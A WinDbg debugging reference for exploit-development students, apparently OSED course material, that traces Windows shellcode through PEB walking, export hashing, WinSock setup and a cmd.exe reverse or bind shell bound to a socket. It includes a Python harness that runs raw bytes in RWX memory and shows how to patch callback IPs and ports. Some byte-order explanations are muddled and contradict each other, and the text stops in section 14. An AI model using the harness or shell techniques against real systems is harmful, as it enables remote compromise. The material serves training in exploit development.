# WinDbg Shellcode Debugging Reference
## OSED / Windows Exploit Development

**Audience:** OSED students testing shellcode produced with the `shellcode` Python library  
**Scope:** Complete WinDbg workflow from initial injection breakpoint through PEB walk, export table resolution, socket setup, and process creation verification  
**Debugger:** WinDbg (classic) — x86 (32-bit) unless noted

---

## Table of Contents

1. [Test Harness Overview](#1-test-harness-overview)
2. [Setting a Breakpoint on Shellcode Start](#2-setting-a-breakpoint-on-shellcode-start)
3. [Memory Permissions Verification](#3-memory-permissions-verification)
4. [Stepping Through the Prologue](#4-stepping-through-the-prologue)
5. [Tracing the PEB Walk — find_kernel32](#5-tracing-the-peb-walk--find_kernel32)
6. [Tracing find_function — Export Table Parse](#6-tracing-find_function--export-table-parse)
7. [Hash Debugging](#7-hash-debugging)
8. [Verifying Resolved Addresses](#8-verifying-resolved-addresses)
9. [Inspecting Stack Slot Values](#9-inspecting-stack-slot-values)
10. [WSAStartup and Socket Setup Tracing](#10-wsastartup-and-socket-setup-tracing)
11. [CreateProcessA / STARTUPINFOA Inspection](#11-createprocessa--startupinfoa-inspection)
12. [Common Failure Modes and Diagnosis](#12-common-failure-modes-and-diagnosis)
13. [Patching Shellcode in Memory](#13-patching-shellcode-in-memory)
14. [Conditional Breakpoints](#14-conditional-breakpoints)
15. [Logging All CALLs in a Range](#15-logging-all-calls-in-a-range)

---

## 1. Test Harness Overview

The standard OSED/shellcode test harness allocates an RWX buffer, copies shellcode into it, and creates a thread to execute it. A minimal Python harness using `ctypes` looks like:

```python
import ctypes
import struct

shellcode = b"\xfc\x48..."   # your assembled shellcode bytes

# Allocate RWX memory
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),   # MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40)      # PAGE_EXECUTE_READWRITE
)

# Copy shellcode into the allocation
buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_int(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)

# Execute via CreateThread
thread = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),   ← thread start = shellcode base
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

ctypes.windll.kernel32.WaitForSingleObject(
    ctypes.c_int(thread),
    ctypes.c_int(-1)
)
```

### Key Interception Points

| Location | What to capture |
|----------|----------------|
| After `VirtualAlloc` returns | `EAX` = shellcode buffer base address |
| Entry to `RtlMoveMemory` | Verify correct bytes are being copied |
| Entry to `CreateThread` | Confirm `lpStartAddress` = your shellcode ptr |
| `ptr` (shellcode base) | Set execution BP here; shellcode begins |

### Attaching WinDbg to the Harness

```
windbg.exe -p <PID>
```
or open the harness under WinDbg:
```
windbg.exe python.exe runner.py
```

When running under WinDbg, Python's initial loader break fires first. Resume with `g` until your breakpoints are hit.

---

## 2. Setting a Breakpoint on Shellcode Start

There are three reliable methods. Choose based on how the harness is structured.

### Method A: Break After VirtualAlloc Returns

Set a BP on `VirtualAlloc`, run to it, then single-step until the CALL returns and `EAX` holds the allocated pointer:

```
0:000> bp kernel32!VirtualAlloc
0:000> g

Breakpoint 0 hit
kernel32!VirtualAlloc:
75ac2340 8bff             mov     edi,edi

0:000> pt      ← run to return of VirtualAlloc

kernel32!VirtualAlloc+0x2b:
75ac236b c21000          ret     0x10

0:000> p       ← one step: now EAX = buffer address

0:000> r eax
eax=01a00000    ← shellcode will land here
```

Now place an execution BP at that address before Python continues:
```
0:000> bp 01a00000
0:000> g
```

### Method B: Hardware Execution Breakpoint

After obtaining the address via Method A's VirtualAlloc intercept, use a hardware BP (survives byte changes, does not modify shellcode):

```
0:000> ba e1 01a00000
```

`e` = on execute, `1` = 1-byte (smallest valid size for execute BPs). This fires the instant EIP reaches `01a00000`.

```
0:000> g

Hardware breakpoint 0 hit
01a00000 fc              cld
```

**Advantage over software BP:** The shellcode bytes are not modified. Critical if your shellcode scans itself for INT3 (`0xCC`) and treats it as a bad-character or self-integrity check.

### Method C: INT3 Patch (`eb`)

If you already know the address and want a software BP you can set manually:

```
0:000> db 01a00000 L1
01a00000  fc                   ← original first byte (CLD)

0:000> eb 01a00000 cc          ← write INT3

0:000> g

Break instruction exception ...
01a00000 cc              int     3
```

After stopping, restore the original byte before single-stepping:
```
0:000> eb 01a00000 fc
0:000> r eip=01a00000   ← reset EIP back to start of shellcode
0:000> p                ← step over the CLD
```

**Warning:** INT3 patching can cause issues if the shellcode contains a bad-character check or XOR decoding pass that hashes its own bytes before executing.

---

## 3. Memory Permissions Verification

Before stepping into shellcode, confirm the allocation has the correct permissions. If permissions are wrong, the first instruction causes an AV.

### `!vprot` — Virtual Protect Query

```
0:000> !vprot 01a00000
BaseAddress:       01a00000
AllocationBase:    01a00000
AllocationProtect: 00000040    ← PAGE_EXECUTE_READWRITE
RegionSize:        00001000
State:             00001000    MEM_COMMIT
Protect:           00000040    PAGE_EXECUTE_READWRITE
Type:              00020000    MEM_PRIVATE
```

**Protection values to recognize:**

| Value | Name | Writable | Executable |
|-------|------|---------|-----------|
| `0x02` | `PAGE_READONLY` | No | No |
| `0x04` | `PAGE_READWRITE` | Yes | No |
| `0x20` | `PAGE_EXECUTE_READ` | No | Yes |
| `0x40` | `PAGE_EXECUTE_READWRITE` | Yes | Yes |
| `0x10` | `PAGE_EXECUTE` | No | Yes |

If you see `0x04` (`PAGE_READWRITE`), the shellcode bytes are present but execution will AV. The `VirtualAlloc` call used `0x04` instead of `0x40`.

### `!address` — Full Region Details

```
0:000> !address 01a00000
Usage:                  <unknown>
BaseAddress:            01a00000
EndAddress:             01a01000
RegionSize:             00001000  (   4.000 kB)
State:                  00001000  MEM_COMMIT
Protect:                00000040  PAGE_EXECUTE_READWRITE
Type:                   00020000  MEM_PRIVATE
AllocationBase:         01a00000
AllocationProtect:      00000040  PAGE_EXECUTE_READWRITE
```

### Verifying Shellcode Bytes Were Copied Correctly

```
0:000> db 01a00000 L20
01a00000  fc 48 83 e4 f0 e8 c8 00-00 00 41 51 41 50 52 51  .H........AQAPRQ
01a00010  56 48 31 d2 65 48 8b 52-00 48 8b 52 18 48 8b 52  VH1.eH.R.H.R.H.R
```

Compare visually or in Python:
```python
expected = shellcode[:0x20].hex()
# match against WinDbg output bytes
```

---

## 4. Stepping Through the Prologue

The shellcode prologue typically:
1. Clears the direction flag (`CLD`)
2. Sets up a frame pointer (`MOV EBP, ESP` or `PUSH EBP / MOV EBP, ESP`)
3. Reserves stack space for resolved function pointers
4. Optionally aligns ESP for SSE calling requirements

### Session — x86 Shellcode Prologue

```
0:003> r
eax=00000000 ebx=00000000 ecx=00000000 edx=00000000
esi=00000000 edi=00000000 eip=01a00000 esp=04cff994
ebp=04cff998 efl=00000200

0:003> u eip L10
01a00000 fc              cld
01a00001 e889000000      call    01a0008f   ← call to set_frame_and_start
01a00006 ...

0:003> p
01a00001 e889000000      call    01a0008f
```

After the `CALL`:
```
0:003> p
01a0008f 5b              pop ebx    ← pop return addr into EBX (shellcode base trick)

0:003> r ebx
ebx=01a00006    ← EBX now holds the address of the byte after the CALL

0:003> p
01a00090 89e5            mov     ebp,esp    ← set up frame
0:003> p
01a00092 81ec...         sub     esp,0x60   ← reserve 0x60 bytes for function ptrs
0:003> r esp
esp=04cff930    ← stack grew down by 0x60
```

**Analyst notes:**
- The `CALL/POP EBX` trick gives position-independent access to shellcode's own base address. `EBX` = shellcode base + 6.
- `MOV EBP, ESP` + `SUB ESP, N` creates the function pointer storage area accessed as `[EBP-4]`, `[EBP-8]`, etc.
- If `SUB ESP` uses an oddly large value, count the slots: `0x60 / 4 = 24` function pointer slots.

---

## 5. Tracing the PEB Walk — `find_kernel32`

The PEB walk locates `kernel32.dll`'s base address without using any API calls. On x86:

```
FS:[0x30]  →  PEB
PEB+0x0C   →  PEB_LDR_DATA (Ldr)
Ldr+0x1C   →  InInitializationOrderModuleList.Flink (first entry)
Entry+0x08 →  DllBase (module base address)
```

### Disassembly of a Typical `find_kernel32`

```
0:003> u 01a000a0 L20
01a000a0 64a130000000    mov     eax,dword ptr fs:[30h]   ; EAX = PEB
01a000a6 8b400c          mov     eax,dword ptr [eax+0Ch] ; EAX = PEB.Ldr
01a000a9 8b401c          mov     eax,dword ptr [eax+1Ch] ; EAX = InitOrder list head flink
01a000ac 8b4008          mov     eax,dword ptr [eax+8]   ; skip ntdll, take next entry's DllBase
                                                           ;   (depends on implementation)
; --- some implementations iterate: ---
01a000b0 8b00            mov     eax,dword ptr [eax]     ; EAX = next entry flink
01a000b2 8b4008          mov     eax,dword ptr [eax+8]   ; EAX = DllBase of that entry
```

### Stepping Through — Annotated Session

**Step 1: Read PEB from FS:[0x30]**
```
0:003> p
01a000a0 64a130000000    mov     eax,dword ptr fs:[30h]

0:003> r eax
eax=7ffd5000    ← PEB base address

0:003> dt ntdll!_PEB 7ffd5000
   +0x002 BeingDebugged : 0x1
   +0x00c Ldr           : 0x77ca2c40 _PEB_LDR_DATA
   ...
```

**Step 2: Read PEB.Ldr**
```
0:003> p
01a000a6 8b400c          mov     eax,dword ptr [eax+0Ch]

0:003> r eax
eax=77ca2c40    ← PEB_LDR_DATA address

0:003> dd 77ca2c40+1c L1
77ca2c5c  002715b8    ← InInitializationOrderModuleList.Flink
```

**Step 3: Follow InitOrder Flink**
```
0:003> p
01a000a9 8b401c          mov     eax,dword ptr [eax+1Ch]

0:003> r eax
eax=002715b8    ← pointer INTO first LDR_DATA_TABLE_ENTRY (at InInitOrderLinks)
```

At this point `EAX` points to the `InInitializationOrderLinks` field of the first entry (ntdll). The `DllBase` is at `EAX - 0x10 + 0x18 = EAX + 0x08`:

```
0:003> dd 002715b8+8 L1
002715c0  77c10000    ← ntdll.dll base (index 0 = ntdll)
```

**Step 4: Walk to the next entry (kernel32)**
```
0:003> p
01a000ac 8b4008          mov     eax,dword ptr [eax+8]
; This reads DllBase of the CURRENT entry.
; If the shellcode first moves EAX to the FLINK and THEN reads +8:

0:003> p
01a000b0 8b00            mov     eax,dword ptr [eax]    ; FLINK to next entry

0:003> r eax
eax=002716b8    ← InInitOrderLinks of second entry

0:003> p
01a000b2 8b4008          mov     eax,dword ptr [eax+8]

0:003> r eax
eax=75a80000    ← kernel32.dll base!
```

**Confirm with ln:**
```
0:003> ln eax
(75a80000)   kernel32   ← confirmed
```

### Register State Summary at End of find_kernel32

```
EAX = 75a80000    kernel32.dll base
EBX = 01a00006    shellcode base + 6 (CALL/POP trick)
ESP = 04cff930    top of allocated frame
EBP = 04cff990    frame pointer
```

---

## 6. Tracing `find_function` — Export Table Parse

`find_function` takes `kernel32.dll`'s base address and a target hash, then locates the function by walking the export table.

### Logical Flow

```
1. Read e_lfanew:          DllBase + 0x3C → offset
2. PE header:              DllBase + e_lfanew
3. Optional header:        PE + 0x18
4. DataDirectory[0]:       OptHdr + 0x60 (x86) → ExportDir RVA
5. ExportDir:              DllBase + ExportDir_RVA
6. AddressOfNames RVA:     ExportDir + 0x20
7. AddressOfNameOrdinals:  ExportDir + 0x24
8. AddressOfFunctions:     ExportDir + 0x1C
9. Loop: hash each name, compare to target
10. On match: use ordinal → EAT index → function RVA → VA
```

### Disassembly Walkthrough

```
0:003> u 01a000c0 L30
01a000c0 8b4308          mov     eax,dword ptr [ebx+8]       ; EAX = DllBase (saved in [EBX+8])
01a000c3 8b403c          mov     eax,dword ptr [eax+3Ch]     ; EAX = e_lfanew
01a000c6 014308          add     eax,dword ptr [ebx+8]       ; EAX = PE hdr VA (base + e_lfanew)
01a000c9 8b4078          mov     eax,dword ptr [eax+78h]     ; EAX = ExportDir RVA (OptHdr+0x60 = PE+0x78)
01a000cc 014308          add     eax,dword ptr [ebx+8]       ; EAX = ExportDir VA
01a000cf 8b5820          mov     ebx,dword ptr [eax+20h]     ; EBX = AddressOfNames RVA
01a000d2 03581...        add     ebx,...                     ; EBX = AddressOfNames VA
```

### Stepping Through — Annotated

**Find e_lfanew:**
```
0:003> p
01a000c3 8b403c          mov     eax,dword ptr [eax+3Ch]

0:003> r eax
eax=00000100    ← e_lfanew = 0x100; PE header at 75a80100
```

**Confirm PE signature:**
```
0:003> db 75a80100 L4
75a80100  50 45 00 00    ← "PE\0\0" ✓
```

**Read ExportDir RVA from offset 0x78:**
```
0:003> p
01a000c9 8b4078          mov     eax,dword ptr [eax+78h]

0:003> r eax
eax=0007e2e0    ← ExportDir RVA

0:003> p
01a000cc 014308          add     eax,dword ptr [ebx+8]
; EAX now = 75a80000 + 0x7e2e0 = 75afe2e0
```

**Inspect the Export Directory:**
```
0:003> dt ntdll!_IMAGE_EXPORT_DIRECTORY 75afe2e0
   +0x014 NumberOfFunctions  : 0x3e5
   +0x018 NumberOfNames      : 0x3e5
   +0x01c AddressOfFunctions : 0x0007e4e4
   +0x020 AddressOfNames     : 0x0007f0b0
   +0x024 AddressOfNameOrdinals : 0x0007fc7c
```

**Name loop — ECX = loop counter:**
```
0:003> u 01a000e0 L15
01a000e0 31c9            xor     ecx,ecx         ; counter = 0
01a000e2 8b3499          mov     esi,dword ptr [ecx*4+ebx] ; ESI = name RVA (EBX = AddressOfNames VA)
01a000e5 0133...         add     esi,...          ; ESI = name string VA
01a000e8 ...             ; hash routine call
01a000f0 3945...         cmp     dword ptr [ebp-X],eax ; compare computed hash to target
01a000f3 75xx            jnz     ...             ; no match, increment ECX and loop
; on match:
01a000f5 8b1491          mov     edx,dword ptr [ecx*4+...]  ; ordinal
01a000f8 0fb7d2          movzx   edx,dx
01a000fb 8b04...         mov     eax,dword ptr [edx*4+...]  ; function RVA from EAT
01a000fe 0143...         add     eax,...          ; function VA
```

---

## 7. Hash Debugging

The name comparison uses a rotate-right hash. If the hash does not match, `find_function` skips the function silently and the returned pointer is NULL.

### Identify the Hash Comparison

Set a BP at the `CMP` instruction in the name loop:
```
0:003> u 01a000f0 L3
01a000f0 394510          cmp     dword ptr [ebp+10h],eax   ; [EBP+10] = target hash
                                                             ; EAX = computed hash
```

```
0:003> bp 01a000f0
0:003> g

Breakpoint 1 hit
01a000f0 394510          cmp     dword ptr [ebp+10h],eax

0:003> r eax
eax=0a4a3a00    ← computed hash for current name

0:003> dd ebp+10 L1
04cff9a0  0a4a3a00    ← target hash matches!
```

### Verify the Name Being Hashed

`ESI` should point to the current function name string:
```
0:003> da esi
75b03f20  "VirtualAlloc"   ← currently hashing "VirtualAlloc"
```

### Verify Expected Hash in Python

```python
from shellcode.hashing import ror_hash   # if using the shellcode library
expected = hex(ror_hash("VirtualAlloc", 13))
# => '0xa4a3a00'  (rotation amount is typically 13 for ROR-13 hash)
```

Or compute manually:
```python
def ror13(s):
    h = 0
    for c in s.encode("ascii") + b"\x00":
        h = ((h >> 13) | (h << 19)) & 0xffffffff
        h = (h + c) & 0xffffffff
    return h

hex(ror13("VirtualAlloc"))  # => '0xa4a3a00'
```

### Watch Multiple Iterations

Use `wt` (watch trace) on the hashing function to see all names processed:
```
0:003> wt -l 2 -oR    ← watch trace, 2 levels deep, show return values
```

Or use a conditional BP to only print when the hash matches a near-value (useful for debugging off-by-one in rotation count):
```
0:003> bp 01a000f0 ".printf \"name=%ma hash=%x\\n\", esi, eax; gc"
```

This prints the name and its computed hash for every iteration without stopping execution.

---

## 8. Verifying Resolved Addresses

After `find_function` returns, `EAX` should hold the function's virtual address.

### Immediate Verification with `ln`

```
0:003> p   ← step over the CALL to find_function

0:003> r eax
eax=75ac2340

0:003> ln eax
(75ac2340)   kernel32!VirtualAlloc   ← correct
```

### Cross-Check with `x`

```
0:003> x kernel32!VirtualAlloc
75ac2340 kernel32!VirtualAlloc
```

Both match: the resolution succeeded.

### NULL Check

```
0:003> r eax
eax=00000000    ← find_function returned NULL

0:003> ln eax
                ← no symbol — the address is 0x0
```

NULL return means the target function name was not found in the export table. Likely causes:
- Wrong hash (wrong name string, wrong rotation amount, wrong endianness)
- Wrong module (searching `ntdll` for a `kernel32` export or vice versa)
- Module has no export table (rare but possible for internal DLLs)

See Section 12 for diagnosis steps.

### Full Resolution Sequence for Multiple Functions

Set a BP after each `find_function` call:
```
0:003> bp 01a00120 ".printf \"VirtualAlloc=%p\\n\", eax; gc"
0:003> bp 01a00140 ".printf \"CreateThread=%p\\n\", eax; gc"
0:003> bp 01a00160 ".printf \"WaitForSingleObject=%p\\n\", eax; gc"
0:003> g
VirtualAlloc=75ac2340
CreateThread=75adf5b0
WaitForSingleObject=75b0a120
```

Verify all are non-NULL and match `x` output before continuing.

---

## 9. Inspecting Stack Slot Values

After the resolution sequence, resolved function pointers are saved in stack slots relative to `EBP`. The shellcode accesses them later as `CALL DWORD PTR [EBP-N]`.

### Display All Slots at Once

```
0:003> dd ebp-0x60 L18    ← 0x60 / 4 = 24 DWORDs; adjust to match your sub esp,N
04cff930  00000000 00000000 00000000 00000000
04cff940  75ac2340 75adf5b0 75b0a120 75ac3180   ← functions start here
04cff950  77c50000 75a80000 00000000 00000000
04cff960  ...
```

### Map Slots to Functions

Identify each slot using `ln`:
```
0:003> ln poi(ebp-0x20)
(75ac2340)   kernel32!VirtualAlloc     ← EBP-0x20
0:003> ln poi(ebp-0x1c)
(75adf5b0)   kernel32!CreateThread     ← EBP-0x1C
0:003> ln poi(ebp-0x18)
(75b0a120)   kernel32!WaitForSingleObject  ← EBP-0x18
0:003> ln poi(ebp-0x14)
(75ac3180)   kernel32!VirtualProtect   ← EBP-0x14
```

Build a slot table by stepping past each save instruction:
```
0:003> u 01a00200 L20
01a00200 8945e0          mov     dword ptr [ebp-20h],eax   ; [EBP-0x20] = VirtualAlloc
01a00203 e8...           call    01a000c0                   ; find_function (CreateThread hash)
01a00208 8945e4          mov     dword ptr [ebp-1Ch],eax   ; [EBP-0x1C] = CreateThread
...
```

---

## 10. WSAStartup and Socket Setup Tracing

For bind-shell and reverse-shell shellcode, WinSock must be initialized before any socket call.

### WSAStartup Sequence

```
0:003> u 01a00300 L10
01a00300 6a02            push    2               ; wVersionRequested = 2.2 → MAKEWORD(2,2) = 0x0202
01a00302 6802020000      push    202h
01a00307 6a90            push    90h             ; sizeof(WSADATA) ≈ 0x190, but shellcode uses sub-alloc
01a00309 ...             push    esp             ; lpWSAData = stack pointer
01a0030b ff55...         call    dword ptr [ebp-XX]  ; WSAStartup
```

**Inspect before the call:**
```
0:003> bp 01a0030b
0:003> g

0:003> dd esp L4
04cff880  00000202 04cff890 ...    ← wVersionRequired=2.2, lpWSAData on stack
```

**After WSAStartup returns:**
```
0:003> r eax
eax=00000000    ← 0 = success; non-zero = WSAStartup failed
```

### WSASocketA / socket Call

```
0:003> u 01a00320 L8
01a00320 6a00            push    0               ; dwFlags = 0
01a00322 6a00            push    0               ; g = 0
01a00324 6a00            push    0               ; protocol = 0 (auto)
01a00326 6a01            push    1               ; type = SOCK_STREAM
01a00328 6a02            push    2               ; af = AF_INET
01a0032a ff55...         call    dword ptr [ebp-XX]  ; WSASocketA / socket
```

**After socket returns:**
```
0:003> r eax
eax=00000084    ← socket descriptor (non-zero = success)
; eax=ffffffff means WSASocketA failed; check WSAGetLastError
```

If the socket call fails:
```
0:003> bp ws2_32!WSAGetLastError
0:003> g
; step over it, read EAX:
0:003> r eax
eax=000027d3    ← 10195 = WSANOTINITIALISED; WSAStartup not called or failed
```

### bind / accept for Bind Shell

```
; push sockaddr_in structure:
0:003> u 01a00350 L10
01a00350 6a00            push    0               ; s_addr = INADDR_ANY
01a00352 6821000115      push    15000021h       ; sin_port=0x2100 (port 33), sin_family=AF_INET=2
                                                  ; Note: port in network byte order
01a00357 8be4            mov     esp,esp
01a00359 54              push    esp             ; *sockaddr
01a0035a 6a10            push    10h             ; namelen = 16
01a0035c 56              push    esi             ; socket descriptor (saved in ESI)
01a0035d ff55...         call    dword ptr [ebp-XX]  ; bind
```

**Inspect the sockaddr_in on the stack:**
```
0:003> db esp L10
04cff880  00 00 21 00 15 00 00 00-00 00 00 00 00 00 00 00
          AF_INET  port(NBO)  s_addr(0.0.0.0)

; Port = 0x0015 in network byte order = port 21 (FTP)
; Verify: 0x0015 → byte-swap → 0x1500 = 5376? No: 0x2100 in NBO = port 33.
; Always byte-swap: stored as big-endian, so 0x2100 → 0x0021 = port 33.
```

### connect for Reverse Shell

```
0:003> db 04cff880 L10
04cff880  02 00 11 5c c0 a8 01 64-00 00 00 00 00 00 00 00
          AF=2  port=4444  192.168.1.100
```

Read the connect destination:
- `02 00` = `AF_INET` (little-endian WORD = 2)
- `11 5c` = port `0x115c` big-endian = `0x5c11` decimal = 23569? Check: `0x115c` = 4444 decimal. Yes: `0x115c = 4444`.
- `c0 a8 01 64` = `192.168.1.100`

---

## 11. CreateProcessA / STARTUPINFOA Inspection

Shellcode spawning `cmd.exe` builds a `STARTUPINFOA` structure on the stack and passes it to `CreateProcessA`. Verifying this structure confirms the shell will launch correctly.

### Set BP Before CreateProcessA

```
0:003> bp kernel32!CreateProcessA
0:003> g

Breakpoint hit
kernel32!CreateProcessA:
75ab1020 8bff            mov     edi,edi
```

### Read Arguments from the Stack

`CreateProcessA` calling convention (stdcall on x86): all arguments on the stack at `[ESP+4]` through `[ESP+28]`:

```
0:003> dd esp L0c
04cff7e0  01a00ab0    ← ret addr
04cff7e4  00000000    ← lpApplicationName = NULL
04cff7e8  01a00a00    ← lpCommandLine
04cff7ec  00000000    ← lpProcessAttributes = NULL
04cff7f0  00000000    ← lpThreadAttributes = NULL
04cff7f4  00000000    ← bInheritHandles = FALSE
04cff7f8  08000000    ← dwCreationFlags = CREATE_NO_WINDOW
04cff7fc  00000000    ← lpEnvironment = NULL
04cff800  00000000    ← lpCurrentDirectory = NULL
04cff804  04cff810    ← lpStartupInfo (on stack)
04cff808  04cff85c    ← lpProcessInformation (on stack)
```

### Verify the Command Line

```
0:003> da poi(esp+8)
01a00a00  "cmd.exe"   ← should be "cmd.exe" or full path
```

Or with full path:
```
0:003> da poi(esp+8)
01a00a00  "C:\Windows\System32\cmd.exe"
```

If this reads garbage or NULL: the shellcode's string offset is wrong.

### Inspect STARTUPINFOA

`lpStartupInfo` is at `[ESP+0x28]` = `04cff810` in the example above.

```
0:003> dt kernel32!_STARTUPINFOA 04cff810
   +0x000 cb           : 0x44           ← must be 0x44 (68 bytes, sizeof STARTUPINFOA)
   +0x004 lpReserved   : (null)
   +0x008 lpDesktop    : (null)
   +0x00c lpTitle      : (null)
   +0x010 dwX          : 0
   +0x014 dwY          : 0
   +0x018 dwXSize      : 0
   +0x01c dwYSize      : 0
   +0x020 dwXCountChars : 0
   +0x024 dwYCountChars : 0
   +0x028 dwFillAttribute : 0
   +0x02c dwFlags      : 0x101         ← STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
   +0x030 wShowWindow  : 0             ← SW_HIDE
   +0x032 cbReserved2  : 0
   +0x034 lpReserved2  : (null)
   +0x038 hStdInput    : 00000084      ← socket fd used as stdin
   +0x03c hStdOutput   : 00000084      ← socket fd used as stdout
   +0x040 hStdError    : 00000084      ← socket fd used as stderr
```

**Key checks:**
- `cb` must be `0x44`. If 0: CreateProcessA will fail with `ERROR_INVALID_PARAMETER`.
- `dwFlags` must include `STARTF_USESTDHANDLES` (`0x100`) to make the redirected handles take effect.
- `hStdInput/Output/Error` must be the valid socket descriptor obtained earlier (e.g., `0x84`).

### Inspect PROCESS_INFORMATION (after CreateProcessA)

```
0:003> pt     ← run to return

0:003> r eax
eax=00000001    ← 1 = success (0 = failure; call GetLastError)

0:003> dt kernel32!_PROCESS_INFORMATION 04cff85c
   +0x000 hProcess    : 0x000000dc    ← handle to new cmd.exe
   +0x004 hThread     : 0x000000e0
   +0x008 dwProcessId : 0x00001a2c    ← PID of new process
   +0x00c dwThreadId  : 0x00001a30
```

Confirm cmd.exe started:
```
0:003> !process 0x1a2c 0
PROCESS 8a3c4040  SessionId: 1  Cid: 1a2c
    Image: cmd.exe
```

---

## 12. Common Failure Modes and Diagnosis

### 12.1 PEB Walk Stops at Wrong Module (Hash Collision)

**Symptom:** `EAX` after `find_function` is a non-NULL address, but `ln eax` shows a different function than expected, or calling it causes an AV.

**Diagnosis:**
```
0:003> ln eax
(75ac1880)   kernel32!VirtualFree   ← wrong; expected VirtualAlloc
```

**Cause:** The hash of "VirtualFree" collides with the hash of "VirtualAlloc" under the given rotation. This is rare with ROR-13 but can happen with custom rotations.

**Fix:**
1. Verify the Python hash computation matches the asm implementation exactly (rotation direction, amount, null-terminator inclusion).
2. Add the null byte: `ror_hash` must process the trailing `\x00` of the function name.
3. Compare:
```python
hex(ror_hash("VirtualAlloc\x00", 13))   # with null
hex(ror_hash("VirtualAlloc", 13))        # without null
# These should differ; use whichever matches your asm
```

### 12.2 NULL Dereference in Export Table

**Symptom:** Access violation when stepping through the export table navigation code.

```
0:003> p
(f34.f38): Access violation - code c0000005
First chance exception ...
eip=01a000cc
0:003> r eax
eax=00000000    ← ExportDir VA is 0
```

**Cause:** `DataDirectory[0].VirtualAddress == 0` — the module has no exports.

**Diagnosis:**
```
0:003> dd <module_base>+3c L1
<addr>  000000f0    ← e_lfanew
0:003> dd <module_base>+f0+78 L2
<addr>  00000000 00000000   ← ExportDir RVA = 0, Size = 0
```

**Fix:** The shellcode's module selection logic is selecting a module with no exports (e.g., a resource-only DLL or an old loader stub). Verify that the module at `InInitializationOrderModuleList[1]` is indeed `kernel32.dll` by checking `BaseDllName` before doing the export walk.

### 12.3 Stack Misalignment Before CALL (AV on Function Entry)

**Symptom:** AV immediately on entering a called Win32 function, no readable disassembly, or crash at the function's prologue.

**Diagnosis:**
```
0:003> r esp
esp=04cff933    ← NOT 4-byte aligned (ends in 3, not 0/4/8/C)
```

**Fix:** Immediately before the `CALL`, adjust `ESP`:
```
0:003> p
01a00500 8d64240x        lea     esp,[esp-X]    ← incorrect alignment fix
```
For x86, `ESP` must be `4-byte aligned` before any CALL. For 64-bit Windows calling convention, `RSP` must be `16-byte aligned` at the point of CALL (so it is 8-byte aligned at the callee's entry due to the pushed return address).

In the shellcode source, add `AND ESP, -4` or `AND ESP, -16` (x64) before the first CALL.

### 12.4 Bad Characters Corrupting Shellcode Bytes

**Symptom:** The shellcode stops at an unexpected address, or a known-good gadget byte has changed.

**Diagnosis — compare bytes at runtime vs. expected:**
```
0:003> db 01a00000 L80
01a00000  fc 48 83 e4 f0 e8 c8 00-00 00 41 51 41 50 52 51
01a00010  56 48 31 d2 65 48 8b 52-00 48 8b 52 00 48 8b 52   ← 0x18→0x00?
```

Compare to the source:
```python
for i, (a, b) in enumerate(zip(shellcode, bytes_in_memory)):
    if a != b:
        print(f"Mismatch at offset 0x{i:04x}: expected 0x{a:02x}, got 0x{b:02x}")
```

**Common bad characters in network exploitation:**

| Byte | Context | Why it breaks |
|------|---------|---------------|
| `0x00` | C strings, strcpy | Null terminator truncates copy |
| `0x0a` | HTTP, line-based protocols | Interpreted as newline |
| `0x0d` | HTTP | Carriage return |
| `0x20` | Whitespace-delimited input | Token separator |
| `0xff` | Some custom protocols | Escape or out-of-range |

**Fix:** Run the shellcode generator with the bad-character exclusion list. In the `shellcode` Python library this is typically a parameter to the encoding/encoder step.

---

## 13. Patching Shellcode in Memory

When a single byte is wrong (wrong port, wrong IP, bad opcode), patching in memory is faster than regenerating and re-running.

### `eb` — Edit Bytes

Change one byte:
```
0:003> db 01a003a0 L4
01a003a0  c0 a8 01 64    ← 192.168.1.100

0:003> eb 01a003a0+3 c8     ← change last octet to 200
0:003> db 01a003a0 L4
01a003a0  c0 a8 01 c8    ← 192.168.1.200
```

Change a port (16-bit, big-endian in `sockaddr_in`):
```
; Change port from 4444 (0x115c) to 8888 (0x22b8)
0:003> db 01a003a6 L2
01a003a6  11 5c    ← port 4444

0:003> eb 01a003a6 22 b8
0:003> db 01a003a6 L2
01a003a6  22 b8    ← port 8888
```

### `ew` — Edit Word (16-bit)

```
0:003> ew 01a003a6 b822    ← little-endian WORD (reversed); use eb for explicit byte order
```

**Note:** `ew` writes in little-endian order on x86. For network byte-order values (big-endian), use `eb` with explicit byte values as shown above.

### `ed` — Edit DWORD

Replace an IP address stored as a DWORD (in `sockaddr_in.sin_addr.s_addr`, network byte order = big-endian):
```
0:003> ed 01a003a8 6401a8c0    ← 100.1.168.192 in NBO = 192.168.1.100
```

Convert Python-side:
```python
import socket, struct
ip = "192.168.1.200"
nbo = struct.unpack(">I", socket.inet_aton(ip))[0]
hex(nbo)  # => '0xc0a801c8'
# WinDbg ed writes in little-endian → supply as c8 01 a8 c0 in byte order
```

### Fix a Wrong Opcode or NOP Sled

```
0:003> db 01a00100 L4
01a00100  31 c0 eb 02    ← XOR EAX,EAX; JMP +2

; Replace with NOPs:
0:003> eb 01a00100 90 90 90 90
0:003> db 01a00100 L4
01a00100  90 90 90 90    ← four NOPs
```

### Re-execute After Patch

After patching, reset `EIP` to the start of the modified region and re-run:
```
0:003> r eip=01a00000
0:003> g
```

---

## 14. Conditional Breakpoints

Conditional breakpoints execute a WinDbg command string when hit, then continue (`gc`) if the condition is not met. This avoids false-positive stops.

### Basic Pattern

```
bp <addr> ".if (<condition>) { <commands> } .else { gc }"
```

### Check for NULL Return from API Call

```
0:003> bp 01a00250 ".if (eax == 0) { .echo 'VirtualAlloc returned NULL'; r; kb; } .else { gc }"
```

Fires and shows context only when `VirtualAlloc` returns NULL; otherwise resumes silently.

### Log Each Iteration of the Hash Loop

```
0:003> bp 01a000f0 ".printf \"[hash loop] name=%ma computed=%x\\n\", esi, eax; gc"
```

Output:
```
[hash loop] name=AcquireSRWLockExclusive computed=1f2e3d4c
[hash loop] name=AcquireSRWLockShared computed=5a6b7c8d
...
